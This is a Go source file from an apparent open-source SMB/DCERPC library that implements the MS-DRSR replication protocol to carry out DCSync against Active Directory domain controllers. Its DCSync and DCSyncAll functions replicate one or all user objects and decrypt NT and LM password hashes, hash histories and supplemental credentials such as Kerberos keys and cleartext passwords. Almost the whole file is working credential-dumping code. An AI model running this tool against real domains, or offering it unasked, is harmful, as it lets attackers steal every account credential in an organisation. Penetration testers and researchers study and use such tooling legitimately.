// MIT License
//
// # Copyright (c) 2026 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

// Package msdrsr implements the MS-DRSR Directory Replication Service Remote
// Protocol, enabling DCSync capabilities for replicating Active Directory
// credentials from domain controllers.
package msdrsr

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"

	"github.com/jfjallid/go-smb/dcerpc"
	"github.com/jfjallid/go-smb/msdtyp"
	"github.com/jfjallid/golog"
)

var (
	log                  = golog.Get("github.com/jfjallid/go-smb/dcerpc/msdrsr")
	le  binary.ByteOrder = binary.LittleEndian
)

const (
	MSRPCUuidDrsuapi                = "e3514235-4b06-11d1-ab04-00c04fc2dcd2"
	MSRPCDrsuapiMajorVersion uint16 = 4
	MSRPCDrsuapiMinorVersion uint16 = 0
)

// DRSUAPI opcodes
const (
	OpDRSBind                 uint16 = 0
	OpDRSUnbind               uint16 = 1
	OpDRSGetNCChanges         uint16 = 3
	OpDRSCrackNames           uint16 = 12
	OpDRSDomainControllerInfo uint16 = 16
)

// DRS_EXTENSIONS_INT capability flags (MS-DRSR 5.39)
const (
	DrsExtBase                   uint32 = 0x00000001
	DrsExtAsyncOp                uint32 = 0x00000002
	DrsExtRemoveApi              uint32 = 0x00000004
	DrsExtMovereqV2              uint32 = 0x00000008
	DrsExtGetchgDeflate          uint32 = 0x00000010
	DrsExtDcInfoV1               uint32 = 0x00000020
	DrsExtRestoreUsnOptimization uint32 = 0x00000040
	DrsExtAddEntry               uint32 = 0x00000080
	DrsExtKccExecute             uint32 = 0x00000100
	DrsExtAddEntryV2             uint32 = 0x00000200
	DrsExtLinkedValueReplication uint32 = 0x00000400
	DrsExtDcInfoV2               uint32 = 0x00000800
	DrsExtCryptoBind             uint32 = 0x00002000
	DrsExtGetReplInfo            uint32 = 0x00004000
	DrsExtStrongEncryption       uint32 = 0x00008000
	DrsExtPostBeta3              uint32 = 0x00080000
	DrsExtGetchgReqV5            uint32 = 0x00100000
	DrsExtGetMemberships2        uint32 = 0x00200000
	DrsExtGetchgReqV6            uint32 = 0x00400000
	DrsExtNondomainNcs           uint32 = 0x00800000
	DrsExtGetchgReqV8            uint32 = 0x01000000
	DrsExtGetchgReplyV5          uint32 = 0x02000000
	DrsExtGetchgReplyV6          uint32 = 0x04000000
	DrsExtWhistlerBeta3          uint32 = 0x08000000
	DrsExtW2k3Deflate            uint32 = 0x10000000
	DrsExtGetchgReqV10           uint32 = 0x20000000
)

// GetNCChanges request flags
const (
	DrsInitSync             uint32 = 0x00000020
	DrsWritRep              uint32 = 0x00000010
	DrsNeverSynced          uint32 = 0x00200000
	DrsFullSyncNow          uint32 = 0x08000000
	DrsFullSyncInProgress   uint32 = 0x10000000
	DrsSyncUrgent           uint32 = 0x00080000
	DrsGetAnc               uint32 = 0x00000800
	DrsSyncForcedReplication uint32 = 0x00000040
)

// Extended operation codes
const (
	ExopNone   uint32 = 0
	ExopReplObj uint32 = 6
)

// DCSyncAttrs controls which credential attributes are requested and processed.
// Flags can be combined to request any subset of attributes.
type DCSyncAttrs uint32

const (
	AttrNTLM     DCSyncAttrs = 1 << 0 // unicodePwd + dBCSPwd
	AttrKerberos DCSyncAttrs = 1 << 1 // supplementalCredentials (Kerberos keys, cleartext, WDigest)
	AttrHistory  DCSyncAttrs = 1 << 2 // NTPwdHistory, LMPwdHistory, SidHistory
	AttrMetadata DCSyncAttrs = 1 << 3 // UserAccountControl, PwdLastSet, AccountExpires,
	//                                   SAMAccountType, UserPrincipalName
)

// Convenience presets
const (
	DCSyncNTLMOnly DCSyncAttrs = AttrNTLM
	DCSyncAll      DCSyncAttrs = AttrNTLM | AttrKerberos | AttrHistory | AttrMetadata
)

// Has returns true if all bits in flag are set in a.
func (a DCSyncAttrs) Has(flag DCSyncAttrs) bool {
	return a&flag != 0
}

// DS_NAME_FORMAT constants for DRSCrackNames
const (
	DSUnknownName          uint32 = 0
	DSFQDNATTName          uint32 = 1
	DSNT4AccountName       uint32 = 2
	DSDisplayName          uint32 = 3
	DSUniqueIdName         uint32 = 6
	DSCanonicalName        uint32 = 7
	DSUserPrincipalName    uint32 = 8
	DSSidOrSidHistoryName  uint32 = 11
	DSDnsName              uint32 = 12
)

// DS_NAME_FLAGS
const (
	DsNameNoFlags    uint32 = 0
	DsNameFlagSyntacticalOnly uint32 = 1
)

// CrackNames result status
const (
	DsNameNoError             uint32 = 0
	DsNameErrorResolving      uint32 = 1
	DsNameErrorNotFound       uint32 = 2
	DsNameErrorNotUnique      uint32 = 3
	DsNameErrorNoMapping      uint32 = 4
	DsNameErrorDomainOnly     uint32 = 5
	DsNameErrorNoSyntactical  uint32 = 6
	DsNameErrorTrustReferral  uint32 = 7
)

// DRSUAPI return codes
const (
	ErrorSuccess       uint32 = 0
	ErrorMoreData      uint32 = 234
	DrsuapiExopErr     uint32 = 8437 // ERROR_DS_DRA_NOT_SUPPORTED
)

var ResponseCodeMap = map[uint32]error{
	ErrorSuccess:  nil,
	ErrorMoreData: fmt.Errorf("More data available"),
	8202:          fmt.Errorf("DS_ERR_NO_SUCH_OBJECT: The specified object does not exist"),
	8333:          fmt.Errorf("ERROR_DS_DRA_INVALID_PARAMETER: Invalid parameter"),
	8419:          fmt.Errorf("ERROR_DS_DRA_ACCESS_DENIED: Access denied for replication"),
	8437:          fmt.Errorf("ERROR_DS_DRA_NOT_SUPPORTED: The operation is not supported"),
	8453:          fmt.Errorf("ERROR_DS_DRA_ACCESS_DENIED: Replication access was denied"),
	8466:          fmt.Errorf("ERROR_DS_DRA_OUT_OF_MEM: Insufficient memory"),
	8451:          fmt.Errorf("ERROR_DS_DRA_DB_ERROR: The directory service encountered a database error"),
	8464:          fmt.Errorf("ERROR_DS_DRA_NO_REPLICA: The specified server is not a replication partner"),
}

type RPCCon struct {
	*dcerpc.ServiceBind
	drsHandle         []byte   // 20-byte context handle from DRSBind
	serverCaps        uint32
	sessionKey        []byte
	ntdsDsaObjectGuid [16]byte // NTDS DSA GUID for the target DC, set by DCSync
}

func NewRPCCon(sb *dcerpc.ServiceBind) *RPCCon {
	return &RPCCon{ServiceBind: sb}
}

// DRSBind performs IDL_DRSBind (opnum 0) to exchange capabilities and obtain
// a DRS_HANDLE context handle for subsequent operations.
func (c *RPCCon) DRSBind() error {
	c.sessionKey = c.GetSessionKey()
	if len(c.sessionKey) == 0 {
		return fmt.Errorf("session key is empty; authenticated bind is required for DRSUAPI")
	}

	// Build DRS_EXTENSIONS_INT with our capabilities
	clientExt := DRSExtensionsInt{
		Flags: DrsExtGetchgReqV6 | DrsExtGetchgReplyV6 |
			DrsExtGetchgReqV8 | DrsExtStrongEncryption |
			DrsExtNondomainNcs,
		SiteObjGuid:     [16]byte{},
		Pid:              0,
		ReplicationEpoch: 0,
		FlagsExt:         0,
		ConfigObjGuid:    [16]byte{},
	}

	extBytes, err := clientExt.MarshalBinary()
	if err != nil {
		return fmt.Errorf("failed to marshal DRS_EXTENSIONS_INT: %w", err)
	}

	//TODO Figure out what is required to use dynamic ndr encoder for this
	// DRSBind request layout (NDR, two top-level [in, unique] pointer params):
	//
	// Parameter 1: puuidClientDsa ([in, unique] UUID *)
	//   [4 bytes]  referent ID (non-zero → has data)
	//   [16 bytes] GUID (NTDSAPI_CLIENT_GUID, deferred)
	//
	// Parameter 2: pextClient ([in, unique] DRS_EXTENSIONS *)
	//   [4 bytes]  referent ID (non-zero → has data)
	//   [4 bytes]  conformant array max_count (hoisted from rgb[])
	//   [4 bytes]  cb (byte count of DRS_EXTENSIONS blob)
	//   [cb bytes] DRS_EXTENSIONS_INT data
	//   [padding]  4-byte alignment padding
	w := bytes.NewBuffer(make([]byte, 0, 128))

	// puuidClientDsa - unique pointer to NTDSAPI_CLIENT_GUID
	// {e24d201a-4fd6-11d1-a3da-0000f875ae0d}
	ntdsapiGuid := [16]byte{
		0x1a, 0x20, 0x4d, 0xe2, 0xd6, 0x4f, 0xd1, 0x11,
		0xa3, 0xda, 0x00, 0x00, 0xf8, 0x75, 0xae, 0x0d,
	}
	err = binary.Write(w, le, uint32(1)) // referent ID
	if err != nil {
		return fmt.Errorf("failed to write puuidClientDsa refId: %w", err)
	}
	_, err = w.Write(ntdsapiGuid[:]) // deferred UUID data
	if err != nil {
		return fmt.Errorf("failed to write puuidClientDsa GUID: %w", err)
	}

	// pextClient - unique pointer to DRS_EXTENSIONS
	cb := uint32(len(extBytes))
	err = binary.Write(w, le, uint32(2)) // referent ID
	if err != nil {
		return fmt.Errorf("failed to write pextClient refId: %w", err)
	}

	// DRS_EXTENSIONS is a conformant struct: max_count is hoisted before cb
	err = binary.Write(w, le, cb) // conformant array max_count (for rgb[])
	if err != nil {
		return fmt.Errorf("failed to write max_count: %w", err)
	}

	err = binary.Write(w, le, cb) // cb field
	if err != nil {
		return fmt.Errorf("failed to write cb: %w", err)
	}

	// Extension bytes (rgb[] array data)
	_, err = w.Write(extBytes)
	if err != nil {
		return fmt.Errorf("failed to write extension bytes: %w", err)
	}

	// Pad to 4-byte alignment
	if pad := (4 - (cb % 4)) % 4; pad > 0 {
		w.Write(make([]byte, pad))
	}

	buffer, err := c.MakeRequest(OpDRSBind, w.Bytes())
	if err != nil {
		return fmt.Errorf("DRSBind MakeRequest failed: %w", err)
	}

	// Parse response:
	// [4 bytes]  ppextServer referent ID (or 0 if null)
	// [4 bytes]  conformant array max_count (hoisted from rgb[]; equals cb)
	// [4 bytes]  cb
	// [cb bytes] DRS_EXTENSIONS_INT server data
	// [pad]      alignment padding
	// [20 bytes] phDrs (DRS_HANDLE)
	// [4 bytes]  return code
	if len(buffer) < 28 {
		return fmt.Errorf("DRSBind response too short: %d bytes", len(buffer))
	}

	r := bytes.NewReader(buffer)

	var serverRefId uint32
	if err = binary.Read(r, le, &serverRefId); err != nil {
		return fmt.Errorf("failed to read server refId: %w", err)
	}

	// A null referent means the server returned no extensions; skip to the DRS_HANDLE.
	if serverRefId != 0 {
		var serverCb uint32
		if err = binary.Read(r, le, &serverCb); err != nil {
			return fmt.Errorf("failed to read server cb: %w", err)
		}

		var serverMaxCount uint32
		if err = binary.Read(r, le, &serverMaxCount); err != nil {
			return fmt.Errorf("failed to read server max_count: %w", err)
		}

		if int(serverCb) > r.Len()-24 {
			return fmt.Errorf("server extension cb %d exceeds remaining buffer", serverCb)
		}

		serverExtData := make([]byte, serverCb)
		if _, err = r.Read(serverExtData); err != nil {
			return fmt.Errorf("failed to read server extension data: %w", err)
		}

		var serverExt DRSExtensionsInt
		if err = serverExt.UnmarshalBinary(serverExtData); err != nil {
			log.Warningf("Failed to fully parse server DRS_EXTENSIONS_INT: %v", err)
		}
		c.serverCaps = serverExt.Flags

		// Skip alignment padding
		if pad := (4 - (serverCb % 4)) % 4; pad > 0 {
			r.Seek(int64(pad), 1)
		}
	}

	// Read DRS_HANDLE (20 bytes)
	c.drsHandle = make([]byte, 20)
	if _, err = r.Read(c.drsHandle); err != nil {
		return fmt.Errorf("failed to read DRS_HANDLE: %w", err)
	}

	// Read return code
	var returnCode uint32
	if err = binary.Read(r, le, &returnCode); err != nil {
		return fmt.Errorf("failed to read return code: %w", err)
	}

	if returnCode != ErrorSuccess {
		status, found := ResponseCodeMap[returnCode]
		if !found {
			return fmt.Errorf("DRSBind returned unknown error code: 0x%x (%d)", returnCode, returnCode)
		}
		return fmt.Errorf("DRSBind failed: %w", status)
	}

	log.Infof("DRSBind successful, server caps: 0x%08x", c.serverCaps)
	return nil
}

// DRSUnbind performs IDL_DRSUnbind (opnum 1) to release the DRS_HANDLE.
func (c *RPCCon) DRSUnbind() error {
	if len(c.drsHandle) != 20 {
		return fmt.Errorf("no valid DRS_HANDLE to unbind")
	}

	w := bytes.NewBuffer(make([]byte, 0, 20))
	w.Write(c.drsHandle)

	buffer, err := c.MakeRequest(OpDRSUnbind, w.Bytes())
	if err != nil {
		return fmt.Errorf("DRSUnbind MakeRequest failed: %w", err)
	}

	if len(buffer) < 24 {
		return fmt.Errorf("DRSUnbind response too short: %d bytes", len(buffer))
	}

	// Response: [20 bytes] phDrs (zeroed handle) + [4 bytes] return code
	returnCode := le.Uint32(buffer[20:24])
	if returnCode != ErrorSuccess {
		status, found := ResponseCodeMap[returnCode]
		if !found {
			return fmt.Errorf("DRSUnbind returned unknown error code: 0x%x", returnCode)
		}
		return fmt.Errorf("DRSUnbind failed: %w", status)
	}

	c.drsHandle = nil
	log.Infoln("DRSUnbind successful")
	return nil
}

// CrackedName holds the result of a single name resolution from DRSCrackNames.
type CrackedName struct {
	Status uint32
	Name   string
	Domain string
}

// DRSCrackNames performs IDL_DRSCrackNames (opnum 12) to translate names between
// different formats (e.g., SAMAccountName to DN, SID to DN).
func (c *RPCCon) DRSCrackNames(formatOffered, formatDesired uint32, names []string) ([]CrackedName, error) {
	if len(c.drsHandle) != 20 {
		return nil, fmt.Errorf("DRSBind must be called before DRSCrackNames")
	}

	innerBuf, err := marshalCrackNamesReq(c.drsHandle, formatOffered, formatDesired, names)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal DRSCrackNames request: %w", err)
	}

	buffer, err := c.MakeRequest(OpDRSCrackNames, innerBuf)
	if err != nil {
		return nil, fmt.Errorf("DRSCrackNames MakeRequest failed: %w", err)
	}

	results, err := unmarshalCrackNamesResp(buffer)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal DRSCrackNames response: %w", err)
	}

	return results, nil
}

// DCInfo holds information about a domain controller returned by DRSDomainControllerInfo.
type DCInfo struct {
	NetbiosName        string
	DnsHostName        string
	SiteName           string
	SiteObjectName     string
	ComputerObjectDN   string
	ServerObjectDN     string
	SiteObjectGuid     [16]byte
	ComputerObjectGuid [16]byte
	ServerObjectGuid   [16]byte
	NtdsDsaObjectGuid  [16]byte
	IsGC               bool
	IsPDC              bool
}

// DRSDomainControllerInfo performs IDL_DRSDomainControllerInfo (opnum 16) to
// retrieve information about domain controllers.
func (c *RPCCon) DRSDomainControllerInfo(domain string, infoLevel uint32) ([]DCInfo, error) {
	if len(c.drsHandle) != 20 {
		return nil, fmt.Errorf("DRSBind must be called before DRSDomainControllerInfo")
	}

	innerBuf, err := marshalDCInfoReq(c.drsHandle, domain, infoLevel)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal DRSDomainControllerInfo request: %w", err)
	}

	buffer, err := c.MakeRequest(OpDRSDomainControllerInfo, innerBuf)
	if err != nil {
		return nil, fmt.Errorf("DRSDomainControllerInfo MakeRequest failed: %w", err)
	}

	results, err := unmarshalDCInfoResp(buffer, infoLevel)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal DRSDomainControllerInfo response: %w", err)
	}

	return results, nil
}

// ReplicatedUser holds the decrypted credentials and metadata for a single
// replicated Active Directory user object.
type ReplicatedUser struct {
	SAMAccountName     string
	UserPrincipalName  string
	ObjectSID          string
	DN                 string
	NTHash             []byte
	LMHash             []byte
	NTHashHistory      [][]byte
	LMHashHistory      [][]byte
	SupplementalCreds  *SupplementalCredentials
	UserAccountControl uint32
	PwdLastSet         uint64
	AccountExpires     uint64
}

// DRSGetNCChanges performs IDL_DRSGetNCChanges (opnum 3) to replicate objects
// from the directory. It handles paging via the FMoreData flag.
func (c *RPCCon) DRSGetNCChanges(ncDN string, objectGuid [16]byte, extendedOp uint32, attrs DCSyncAttrs) ([]ENTINF, *SchemaPrefixTable, error) {
	if len(c.drsHandle) != 20 {
		return nil, nil, fmt.Errorf("DRSBind must be called before DRSGetNCChanges")
	}

	var allEntries []ENTINF
	var prefixTable *SchemaPrefixTable
	var usnFrom USNVector
	var uptodateVec *UPTODATEVectorV2

	for {
		// Always use V8 request format for maximum compatibility.
		// V10 adds ulMoreFlags but some servers handle it differently.
		innerBuf, err := marshalGetNCChangesReq(c.drsHandle, ncDN, objectGuid, c.ntdsDsaObjectGuid, extendedOp, usnFrom, uptodateVec, false, attrs)
		if err != nil {
			return nil, nil, fmt.Errorf("failed to marshal GetNCChanges request: %w", err)
		}

		buffer, err := c.MakeRequest(OpDRSGetNCChanges, innerBuf)
		if err != nil {
			return nil, nil, fmt.Errorf("DRSGetNCChanges MakeRequest failed: %w", err)
		}

		resp, err := unmarshalGetNCChangesResp(buffer)
		if err != nil {
			return nil, nil, fmt.Errorf("failed to unmarshal GetNCChanges response: %w", err)
		}

		if prefixTable == nil {
			prefixTable = &resp.PrefixTableSrc
		}

		allEntries = append(allEntries, resp.Entries...)

		if !resp.FMoreData {
			break
		}

		// Update cursor for next page
		usnFrom = resp.UsnvecTo
		uptodateVec = resp.UpToDateVec
	}

	return allEntries, prefixTable, nil
}

// ensureDsaGuid fetches the NTDS DSA Object GUID from the target DC if not
// already cached. This GUID is required for DRSGetNCChanges requests.
func (c *RPCCon) ensureDsaGuid(domain string) error {
	if c.ntdsDsaObjectGuid != [16]byte{} {
		return nil // Already set
	}

	dcInfos, err := c.DRSDomainControllerInfo(domain, 2)
	if err != nil {
		return fmt.Errorf("DRSDomainControllerInfo failed: %w", err)
	}
	if len(dcInfos) == 0 {
		return fmt.Errorf("DRSDomainControllerInfo returned no results")
	}

	// Use the first DC's NTDS DSA GUID (typically the target DC itself)
	c.ntdsDsaObjectGuid = dcInfos[0].NtdsDsaObjectGuid
	log.Infof("Using NTDS DSA GUID from DC %q", dcInfos[0].DnsHostName)
	return nil
}

// DCSync replicates a single user object from the directory and returns the
// decrypted credentials. The target can be a SAMAccountName (DOMAIN\user),
// distinguished name, SID string, or userPrincipalName.
func (c *RPCCon) DCSync(target string, attrs DCSyncAttrs) (*ReplicatedUser, error) {
	// Resolve the target to a GUID and DN via CrackNames
	objectGuid, dn, err := c.resolveTarget(target)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve target %q: %w", target, err)
	}

	// Extract domain from target for DRSDomainControllerInfo
	domain := extractDomain(target, dn)
	if err := c.ensureDsaGuid(domain); err != nil {
		return nil, fmt.Errorf("failed to get NTDS DSA GUID: %w", err)
	}

	log.Debugf("DCSync target=%q dn=%q objectGuid=%x ntdsDsaGuid=%x", target, dn, objectGuid, c.ntdsDsaObjectGuid)

	// Pass the DN in the DSNAME.
	// The GUID identifies the object for EXOP_REPL_OBJ, but the server may
	// use the DN for naming context resolution.
	entries, prefixTable, err := c.DRSGetNCChanges(dn, objectGuid, ExopReplObj, attrs)
	if err != nil {
		return nil, fmt.Errorf("DRSGetNCChanges failed: %w", err)
	}

	if len(entries) == 0 {
		return nil, fmt.Errorf("no entries returned for %q", target)
	}

	user, err := c.processEntry(&entries[0], prefixTable, attrs)
	if err != nil {
		return nil, fmt.Errorf("failed to process replicated entry: %w", err)
	}
	if user == nil {
		return nil, fmt.Errorf("no usable data returned for %q", target)
	}

	user.DN = dn
	return user, nil
}

// DCSyncAll replicates all user objects from the given naming context and
// returns decrypted credentials for each. ncDN should be the domain's
// distinguished name (e.g., "DC=contoso,DC=com").
func (c *RPCCon) DCSyncAll(ncDN string, attrs DCSyncAttrs) ([]ReplicatedUser, error) {
	// Extract domain from DN for DRSDomainControllerInfo
	domain := domainFromDN(ncDN)
	if err := c.ensureDsaGuid(domain); err != nil {
		return nil, fmt.Errorf("failed to get NTDS DSA GUID: %w", err)
	}

	entries, prefixTable, err := c.DRSGetNCChanges(ncDN, [16]byte{}, ExopNone, attrs)
	if err != nil {
		return nil, fmt.Errorf("DRSGetNCChanges failed: %w", err)
	}

	var users []ReplicatedUser
	for i := range entries {
		user, err := c.processEntry(&entries[i], prefixTable, attrs)
		if err != nil {
			log.Warningf("Failed to process entry %d: %v", i, err)
			continue
		}
		if user != nil {
			users = append(users, *user)
		}
	}

	return users, nil
}

// resolveTarget uses DRSCrackNames to resolve various target formats to a
// GUID and DN.
func (c *RPCCon) resolveTarget(target string) (guid [16]byte, dn string, err error) {
	// Try to determine the format
	var formatOffered uint32

	switch {
	case len(target) > 4 && target[0] == 'S' && target[1] == '-':
		formatOffered = DSSidOrSidHistoryName
	case len(target) > 3 && (target[len(target)-1] == '}'):
		formatOffered = DSUniqueIdName
	case strings.ContainsRune(target, '\\'):
		formatOffered = DSNT4AccountName
	case len(target) > 3 && target[:3] == "CN=" || (len(target) > 3 && target[:3] == "DC="):
		formatOffered = DSFQDNATTName
	default:
		formatOffered = DSUserPrincipalName
	}

	// First resolve to DN (FQDN_1779)
	results, err := c.DRSCrackNames(formatOffered, DSFQDNATTName, []string{target})
	if err != nil {
		return guid, "", err
	}
	if len(results) == 0 {
		return guid, "", fmt.Errorf("no results from CrackNames for %q", target)
	}
	if results[0].Status != DsNameNoError {
		return guid, "", fmt.Errorf("CrackNames failed for %q: status %d", target, results[0].Status)
	}
	dn = results[0].Name

	// Now resolve DN to GUID
	guidResults, err := c.DRSCrackNames(DSFQDNATTName, DSUniqueIdName, []string{dn})
	if err != nil {
		return guid, "", fmt.Errorf("failed to resolve DN to GUID: %w", err)
	}
	if len(guidResults) == 0 || guidResults[0].Status != DsNameNoError {
		return guid, "", fmt.Errorf("CrackNames DN→GUID failed for %q", dn)
	}

	guid, err = parseGuidString(guidResults[0].Name)
	if err != nil {
		return guid, "", fmt.Errorf("failed to parse GUID %q: %w", guidResults[0].Name, err)
	}

	return guid, dn, nil
}

// processEntry extracts user credentials from a replicated ENTINF using the
// prefix table to map attribute IDs.
func (c *RPCCon) processEntry(entry *ENTINF, pt *SchemaPrefixTable, attrs DCSyncAttrs) (*ReplicatedUser, error) {
	user := &ReplicatedUser{}
	var rid uint32
	var hasSecrets bool

	// Extract SID from the DSNAME if available (fallback for when objectSid
	// attribute is not returned in the replication response).
	if entry.PName != nil && entry.PName.SidLen > 0 {
		var sid msdtyp.SID
		if err := sid.UnmarshalBinary(entry.PName.Sid[:entry.PName.SidLen]); err == nil {
			user.ObjectSID = msdtyp.ConvertSIDtoStr(&sid)
			if sid.NumAuth > 0 {
				rid = sid.SubAuthorities[sid.NumAuth-1]
			}
		}
	}
	log.Debugf("processEntry: handling SID=%s\n", user.ObjectSID)

	for i := range entry.AttrBlock.PAttr {
		attr := &entry.AttrBlock.PAttr[i]

		// Map the attribute type using the prefix table
		attId := pt.AttIdFromPrefixTable(attr.AttrTyp)
		log.Debugf("attr[%d]: serverTyp=%d resolvedAttId=%d valCount=%d",
			i, attr.AttrTyp, attId, attr.AttrVal.ValCount)

		for j := range attr.AttrVal.PVal {
			val := attr.AttrVal.PVal[j].PVal

			switch attId {
			case AttSAMAccountName:
				user.SAMAccountName, _ = msdtyp.FromUnicodeString(val)
			case AttUserPrincipalName:
				user.UserPrincipalName, _ = msdtyp.FromUnicodeString(val)
			case AttObjectSid:
				if len(val) >= 8 {
					var sid msdtyp.SID
					err := sid.UnmarshalBinary(val)
					if err == nil {
						user.ObjectSID = msdtyp.ConvertSIDtoStr(&sid)
						// Extract RID (last sub-authority)
						if sid.NumAuth > 0 {
							rid = sid.SubAuthorities[sid.NumAuth-1]
						}
					}
				}
			case AttUserAccountControl:
				if len(val) >= 4 {
					user.UserAccountControl = le.Uint32(val)
				}
			case AttPwdLastSet:
				if len(val) >= 8 {
					user.PwdLastSet = le.Uint64(val)
				}
			case AttAccountExpires:
				if len(val) >= 8 {
					user.AccountExpires = le.Uint64(val)
				}
			case AttUnicodePwd:
				decrypted, err := DecryptSecret(c.sessionKey, val)
				if err != nil {
					log.Warningf("Failed to decrypt unicodePwd: %v", err)
					continue
				}
				user.NTHash = RemoveRIDEncryption(decrypted, rid, false)
				hasSecrets = true
			case AttDBCSPwd:
				decrypted, err := DecryptSecret(c.sessionKey, val)
				if err != nil {
					log.Warningf("Failed to decrypt dBCSPwd: %v", err)
					continue
				}
				user.LMHash = RemoveRIDEncryption(decrypted, rid, true)
				hasSecrets = true
			case AttNTPwdHistory:
				decrypted, err := DecryptSecret(c.sessionKey, val)
				if err != nil {
					log.Warningf("Failed to decrypt NTPwdHistory: %v", err)
					continue
				}
				user.NTHashHistory = extractHashHistory(decrypted, rid, false)
				hasSecrets = true
			case AttLMPwdHistory:
				decrypted, err := DecryptSecret(c.sessionKey, val)
				if err != nil {
					log.Warningf("Failed to decrypt LMPwdHistory: %v", err)
					continue
				}
				user.LMHashHistory = extractHashHistory(decrypted, rid, true)
				hasSecrets = true
			case AttSupplementalCredentials:
				decrypted, err := DecryptSecret(c.sessionKey, val)
				if err != nil {
					log.Warningf("Failed to decrypt supplementalCredentials: %v", err)
					continue
				}
				sc, err := ParseSupplementalCredentials(decrypted)
				if err != nil {
					log.Warningf("Failed to parse supplementalCredentials: %v", err)
					continue
				}
				user.SupplementalCreds = sc
				hasSecrets = true
			}
		}
	}

	if !hasSecrets && user.SAMAccountName == "" {
		log.Debugf("processEntry: no secrets and no SAMAccountName found, returning nil")
		return nil, nil
	}
	log.Debugf("processEntry: hasSecrets=%v SAMAccountName=%q SID=%q", hasSecrets, user.SAMAccountName, user.ObjectSID)

	return user, nil
}

// extractHashHistory splits a decrypted hash history blob into individual
// 16-byte hashes, removing the RID-based DES encryption from each.
func extractHashHistory(decrypted []byte, rid uint32, isLM bool) [][]byte {
	if len(decrypted) < 16 {
		return nil
	}
	var hashes [][]byte
	for i := 0; i+16 <= len(decrypted); i += 16 {
		hash := RemoveRIDEncryption(decrypted[i:i+16], rid, isLM)
		hashes = append(hashes, hash)
	}
	return hashes
}

// extractDomain derives a domain name from the target string or DN.
// For DOMAIN\user format, returns DOMAIN. Otherwise falls back to domainFromDN.
func extractDomain(target, dn string) string {
	if i := strings.IndexByte(target, '\\'); i > 0 {
		return target[:i]
	}
	return domainFromDN(dn)
}

// domainFromDN extracts a DNS domain name from a distinguished name.
// e.g., "DC=skynet-ops,DC=local" → "skynet-ops.local"
func domainFromDN(dn string) string {
	var parts []string
	for _, component := range strings.Split(dn, ",") {
		component = strings.TrimSpace(component)
		if strings.HasPrefix(strings.ToUpper(component), "DC=") {
			parts = append(parts, component[3:])
		}
	}
	return strings.Join(parts, ".")
}

